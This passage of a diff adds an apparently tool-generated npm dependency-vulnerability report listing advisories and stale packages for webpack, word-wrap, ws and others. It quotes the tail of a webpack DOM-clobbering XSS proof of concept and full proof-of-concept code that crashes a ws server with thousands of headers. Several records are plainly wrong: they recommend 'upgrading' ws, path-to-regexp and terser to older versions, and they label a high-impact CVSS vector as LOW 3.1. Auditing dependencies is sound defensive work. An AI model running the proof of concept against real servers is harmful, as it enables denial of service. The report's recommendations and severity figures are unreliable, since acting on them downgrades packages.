src=\"./dist/webpack-gadgets.bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.\n\n### Patch\n\nA possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() => {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl && document) {\n/******/ \t\t\tif (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nPlease note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-08-27T19:50:40Z",
+        "modifiedDate": "2025-07-29T11:26:59.611456Z",
+        "daysSincePublished": 477
+      },
+      "affected": {
+        "package": "webpack",
+        "version": "5.53.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "5.53.0",
+        "fixedIn": "5.94.0",
+        "recommendation": "Upgrade to 5.94.0 or later",
+        "fixAvailableSince": "2025-07-29T11:26:59.611Z",
+        "daysSinceFix": 141,
+        "monthsSinceFix": 4,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43788"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/webpack/issues/18718#issuecomment-2326296270"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/webpack/commit/955e057abc6cc83cbc3fa1e1ef67a49758bf5a61"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/webpack/webpack"
+        },
+        {
+          "type": "WEB",
+          "url": "https://research.securitum.com/xss-in-amp4email-dom-clobbering"
+        },
+        {
+          "type": "WEB",
+          "url": "https://scnps.co/papers/sp23_domclob.pdf"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-hc6q-2mpp-qw7j",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-28154"
+      ],
+      "summary": "Cross-realm object access in Webpack 5",
+      "details": "Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object.",
+      "cwes": [],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-03-13T03:30:15Z",
+        "modifiedDate": "2023-11-08T04:12:09.414542Z",
+        "daysSincePublished": 1010
+      },
+      "affected": {
+        "package": "webpack",
+        "version": "5.53.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "5.53.0",
+        "fixedIn": "5.76.0",
+        "recommendation": "Upgrade to 5.76.0 or later",
+        "fixAvailableSince": "2023-11-08T04:12:09.414Z",
+        "daysSinceFix": 770,
+        "monthsSinceFix": 25,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28154"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/webpack/pull/16500"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/webpack/compare/v5.75.0...v5.76.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AU7BOXTBK3KDYSWH67ASZ22TUIOZ3X5G"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PPSAXUTXBCCTAHTCX5BUR4YVP25XALQ3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U2AFCM6FFE3LRYI6KNEQWKMXMQOBZQ2D"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-j8xg-fqg3-53r7",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-26115"
+      ],
+      "summary": "word-wrap vulnerable to Regular Expression Denial of Service",
+      "details": "All versions of the package word-wrap are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within the result variable.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-06-22T06:30:18Z",
+        "modifiedDate": "2025-02-13T19:00:43Z",
+        "daysSincePublished": 909
+      },
+      "affected": {
+        "package": "word-wrap",
+        "version": "1.2.3",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.2.3",
+        "fixedIn": "1.2.4",
+        "recommendation": "Upgrade to 1.2.4 or later",
+        "fixAvailableSince": "2025-02-13T19:00:43.000Z",
+        "daysSinceFix": 307,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26115"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jonschlinkert/word-wrap/commit/420dce9a2412b21881202b73a3c34f0edc53cb2e"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jonschlinkert/word-wrap"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jonschlinkert/word-wrap/blob/master/index.js#L39"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jonschlinkert/word-wrap/blob/master/index.js%23L39"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jonschlinkert/word-wrap/releases/tag/1.2.4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20240621-0006"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-4058657"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-WORDWRAP-3149973"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-3h5v-q93c-6h6q",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-37890"
+      ],
+      "summary": "ws affected by a DoS when handling a request with many HTTP headers",
+      "details": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
+      "cwes": [
+        {
+          "id": "CWE-476",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-06-17T19:09:10Z",
+        "modifiedDate": "2024-07-15T22:12:28.401556Z",
+        "daysSincePublished": 548
+      },
+      "affected": {
+        "package": "ws",
+        "version": "7.5.5",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "7.5.5",
+        "fixedIn": "5.2.4",
+        "recommendation": "Upgrade to 5.2.4 or later",
+        "fixAvailableSince": "2024-07-15T22:12:28.401Z",
+        "daysSinceFix": 519,
+        "monthsSinceFix": 17,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/websockets/ws/issues/2230"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/websockets/ws/pull/2231"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/websockets/ws"
+        }
+      ]
+    }
+  ],
+  "staleDependencies": [
+    {
+      "package": "brace-expansion",
+      "currentVersion": "1.1.11",
+      "fixedIn": "2.0.2",
+      "vulnerabilities": [
+        "GHSA-v6h2-p8h4-qcjw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 2.0.2 or later",
+      "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+      "daysSinceFix": 188,
+      "monthsSinceFix": 6,
+      "isOldFix": true
+    },
+    {
+      "package": "braces",
+      "currentVersion": "3.0.2",
+      "fixedIn": "3.0.3",
+      "vulnerabilities": [
+        "GHSA-grv7-fg5c-xmjg"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 3.0.3 or later",
+      "fixAvailableSince": "2024-07-15T22:12:28.795Z",
+      "daysSinceFix": 519,
+      "monthsSinceFix": 17,
+      "isOldFix": true
+    },
+    {
+      "package": "cross-spawn",
+      "currentVersion": "7.0.3",
+      "fixedIn": "7.0.5",
+      "vulnerabilities": [
+        "GHSA-3xgq-45jj-v275"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 7.0.5 or later",
+      "fixAvailableSince": "2025-05-19T19:56:26.000Z",
+      "daysSinceFix": 212,
+      "monthsSinceFix": 7,
+      "isOldFix": true
+    },
+    {
+      "package": "jpeg-js",
+      "currentVersion": "0.4.3",
+      "fixedIn": "0.4.4",
+      "vulnerabilities": [
+        "GHSA-xvf7-4v9q-58w6"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 0.4.4 or later",
+      "fixAvailableSince": "2025-01-14T10:56:51.595Z",
+      "daysSinceFix": 337,
+      "monthsSinceFix": 11,
+      "isOldFix": true
+    },
+    {
+      "package": "js-yaml",
+      "currentVersion": "3.14.1",
+      "fixedIn": "4.1.1",
+      "vulnerabilities": [
+        "GHSA-mh29-5h37-fv8m"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.1.1 or later",
+      "fixAvailableSince": "2025-11-17T15:20:43.000Z",
+      "daysSinceFix": 30,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "js-yaml",
+      "currentVersion": "4.1.0",
+      "fixedIn": "4.1.1",
+      "vulnerabilities": [
+        "GHSA-mh29-5h37-fv8m"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.1.1 or later",
+      "fixAvailableSince": "2025-11-17T15:20:43.000Z",
+      "daysSinceFix": 30,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "koa",
+      "currentVersion": "2.13.1",
+      "fixedIn": "2.15.4",
+      "vulnerabilities": [
+        "GHSA-593f-38f6-jp5m",
+        "GHSA-jgmv-j7ww-jx2x",
+        "GHSA-x2rg-q646-7m2v"
+      ],
+      "severity": "MEDIUM",
+      "recommendation": "Upgrade to 2.15.4 or later",
+      "fixAvailableSince": "2025-02-12T19:27:07.225Z",
+      "daysSinceFix": 308,
+      "monthsSinceFix": 10,
+      "isOldFix": true
+    },
+    {
+      "package": "micromatch",
+      "currentVersion": "4.0.4",
+      "fixedIn": "4.0.8",
+      "vulnerabilities": [
+        "GHSA-952p-6rrq-rcjv"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.0.8 or later",
+      "fixAvailableSince": "2024-08-28T13:12:26.000Z",
+      "daysSinceFix": 476,
+      "monthsSinceFix": 15,
+      "isOldFix": true
+    },
+    {
+      "package": "minimatch",
+      "currentVersion": "3.0.4",
+      "fixedIn": "3.0.5",
+      "vulnerabilities": [
+        "GHSA-f8q6-p94x-37v3"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 3.0.5 or later",
+      "fixAvailableSince": "2024-02-14T18:15:16.000Z",
+      "daysSinceFix": 672,
+      "monthsSinceFix": 22,
+      "isOldFix": true
+    },
+    {
+      "package": "nanoid",
+      "currentVersion": "3.3.1",
+      "fixedIn": "5.0.9",
+      "vulnerabilities": [
+        "GHSA-mwcw-c2x4-8c55"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 5.0.9 or later",
+      "fixAvailableSince": "2025-11-04T16:54:54.000Z",
+      "daysSinceFix": 43,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "on-headers",
+      "currentVersion": "1.0.2",
+      "fixedIn": "1.1.0",
+      "vulnerabilities": [
+        "GHSA-76c9-3jph-rj3q"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1.1.0 or later",
+      "fixAvailableSince": "2025-07-17T21:44:33.423Z",
+      "daysSinceFix": 152,
+      "monthsSinceFix": 5,
+      "isOldFix": false
+    },
+    {
+      "package": "path-to-regexp",
+      "currentVersion": "6.2.0",
+      "fixedIn": "1.9.0",
+      "vulnerabilities": [
+        "GHSA-9wv6-86v2-598j"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1.9.0 or later",
+      "fixAvailableSince": "2025-01-24T21:31:27.000Z",
+      "daysSinceFix": 326,
+      "monthsSinceFix": 10,
+      "isOldFix": true
+    },
+    {
+      "package": "playwright",
+      "currentVersion": "1.15.0",
+      "fixedIn": "1.55.1",
+      "vulnerabilities": [
+        "GHSA-7mvr-c777-76hp"
+      ],
+      "severity": "MEDIUM",
+      "recommendation": "Upgrade to 1.55.1 or later",
+      "fixAvailableSince": "2025-10-24T20:05:47.000Z",
+      "daysSinceFix": 54,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "semver",
+      "currentVersion": "7.3.5",
+      "fixedIn": "7.5.2",
+      "vulnerabilities": [
+        "GHSA-c2qf-rxjj-qqgw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 7.5.2 or later",
+      "fixAvailableSince": "2024-12-06T20:34:31.000Z",
+      "daysSinceFix": 375,
+      "monthsSinceFix": 12,
+      "isOldFix": true
+    },
+    {
+      "package": "serialize-javascript",
+      "currentVersion": "6.0.0",
+      "fixedIn": "6.0.2",
+      "vulnerabilities": [
+        "GHSA-76p7-773f-r4q5"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 6.0.2 or later",
+      "fixAvailableSince": "2025-11-28T21:46:28.307Z",
+      "daysSinceFix": 18,
+      "monthsSinceFix": 0,
+      "isOldFix": false
+    },
+    {
+      "package": "terser",
+      "currentVersion": "5.9.0",
+      "fixedIn": "4.8.1",
+      "vulnerabilities": [
+        "GHSA-4wf5-vphf-c2xc"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.8.1 or later",
+      "fixAvailableSince": "2025-01-14T10:57:13.174Z",
+      "daysSinceFix": 337,
+      "monthsSinceFix": 11,
+      "isOldFix": true
+    },
+    {
+      "package": "webpack",
+      "currentVersion": "5.53.0",
+      "fixedIn": "5.94.0",
+      "vulnerabilities": [
+        "GHSA-4vvj-4cpr-p986",
+        "GHSA-hc6q-2mpp-qw7j"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 5.94.0 or later",
+      "fixAvailableSince": "2025-07-29T11:26:59.611Z",
+      "daysSinceFix": 141,
+      "monthsSinceFix": 4,
+      "isOldFix": false
+    },
+    {
+      "package": "word-wrap",
+      "currentVersion": "1.2.3",
+      "fixedIn": "1.2.4",
+      "vulnerabilities": [
+        "GHSA-j8xg-fqg3-53r7"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1.2.4 or later",
+      "fixAvailableSince": "2025-02-13T19:00:43.000Z",
+      "daysSinceFix": 307,
+      "monthsSinceFix": 10,
+      "isOldFix": true
+    },
+    {
+      "package": "ws",
+      "currentVersion": "7.5.5",
+      "fixedIn": "5.2.4",
+      "vulnerabilities": [
+        "GHSA-3h5v-q93c-6h6q"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 5.2.4 or later",
+      "fixAvailableSince": "2024-07-15T22:12:28.401Z",
+      "daysSinceFix": 519,
+      "monthsSinceFix": 17,
+      "isOldFix": true
+    }
+  ],
+  "recommendations": [
+    {
+      "priority": "MEDIUM",
+      "message": "5 vulnerabilities were recently discovered (< 6 months old)."
+    },
+    {
+      "priority": "HIGH",
+      "message": "14 packages have fixes available for >6 months. Update urgently!"
+    },
+    {
+      "priority": "MEDIUM",
+      "message": "22 packages have known vulnerabilities with available fixes. Update recommended."
+    }
+  ]
+}
